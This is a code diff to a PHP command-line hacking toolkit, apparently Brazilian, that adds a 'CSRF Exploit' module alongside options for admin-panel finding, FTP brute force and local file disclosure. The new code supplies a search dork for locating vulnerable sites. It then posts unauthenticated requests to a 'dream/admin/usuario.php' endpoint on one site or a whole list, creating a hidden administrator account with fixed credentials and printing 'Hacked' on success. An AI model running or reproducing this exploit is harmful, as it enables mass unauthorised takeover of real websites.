@@ -1,10 +1,15 @@
 <?php
-	/*
-		[+] Criado Por Pablo Santhus
-		[+] 0x_Sec Toll hacking
-		[+] 22/11/16
 
-	*/
+	# Autor: Pablo Santhus
+	# Titulo: 0xsec
+	# Software Link: https://github.com/PabloSanthus/0x_Sec
+	# Plataforma: PHP
+	# Data: 22/11/16
+	# Atualizacao: 24/12/2016
+	# Versao: 1.0
+	# Testado em: [Kali linux 2.0 | Windows 7]
+
+
 		error_reporting(0);
 		function banner(){
 			echo "
@@ -27,7 +32,7 @@
 
 		if($argv[1] == "-h"){
 		echo "
-	OPTIONS [ADMIN, MD5, EMAIL, FTPBRUTE, LFD, BASE64]
+	OPTIONS [ADMIN, MD5, EMAIL, FTPBRUTE, LFD, BASE64, CSRF]
 
 	[1] ADMIN
 	[2] MD5
@@ -35,6 +40,7 @@
 	[4] FTPBRUTE
 	[5] LFD
 	[6] BASE64
+	[7] CSRF Exploit
 
 	";
 	if(!isset($argv[2])){
@@ -113,11 +119,31 @@
 	-e 		Encriptar em Base64 
 	-d 		Decode em Base64 
 
-	exemplo: php 0x_sec.php -e pablo 
-	exemplo: php 0x_sec.php -d cGFibG8=\n\n
+	exemplo: php 0x_sec.php BASE64 -e pablo 
+	exemplo: php 0x_sec.php BASE64 -d cGFibG8=\n\n
 
 
-		";
+		";}
+
+	if($argv[1] == "-h" && $argv[2] == 7){
+		echo "
+
+
+	[+] CSRF Exploit
+
+	dork: inurl:dream/album.php
+
+	-u 		Apenas um site a ser explorado.
+	-url 		Mais de um site a ser explorado.
+	-h 		Painel de ajuda.
+
+	exemplos:
+
+	php CSRF.php CSRF -u http://www.pablo.com/
+	php CSRF.php CSRF -url sites.txt
+
+	";
+
 	}
 
 		if($argv[1] == "ADMIN"){
@@ -339,5 +365,56 @@ if(isset($argv[5])){
 			print " ---------------------------------------------------\n";
 		}
 	}
+
+	if($argv[1] == "CSRF"){
+
+		if(isset($argv[3]) && $argv[2] == "-u"){
+		$web = $argv[3] . "/";
+		$complemento = "dream/admin/usuario.php?action=incluir";
+
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, $web.$complemento);
+		curl_setopt($ch, CURLOPT_HEADER, 0);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_POST, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS,  "user_login=pablo&user_password=pablo&Add-Admin");
+		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110". rand(90, 201));
+		$exec = curl_exec($ch);
+		if(strstr($exec, "Login")){
+			echo "[+] Hacked > user: pablo password: pablo >> {$web}/dream/admin/login.php\n";
+		}else{
+			echo "[-] Not Hacked >> {$web}\n";
+		}
+
+	}
+
+	if(isset($argv[3]) && $argv[2] == "-url"){
+		$web = $argv[3];
+		$ww = file($web);
+		
+		foreach($ww as $webs){
+			$webs = str_replace("\r", "", $webs);
+			$webs = str_replace("\n", "", $webs);
+
+			$complemento = "/dream/admin/usuario.php?action=incluir";
+
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_URL, $webs.$complemento);
+			curl_setopt($ch, CURLOPT_HEADER, 0);
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+			curl_setopt($ch, CURLOPT_POST, 1);
+			curl_setopt($ch, CURLOPT_POSTFIELDS,  "user_login=pablo&user_password=pablo&Add-Admin");
+			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110". rand(90, 201));
+			$exec = curl_exec($ch);
+			if(strstr($exec, "Login")){
+				echo "[+] Hacked > user: pablo password: pablo >> Login {$webs}/dream/admin/login.php\n";
+			}else{
+				echo "[-] Not Hacked >> {$webs}\n";
+			}
+									
+		}
+	}
+	}
+
 
 ?>
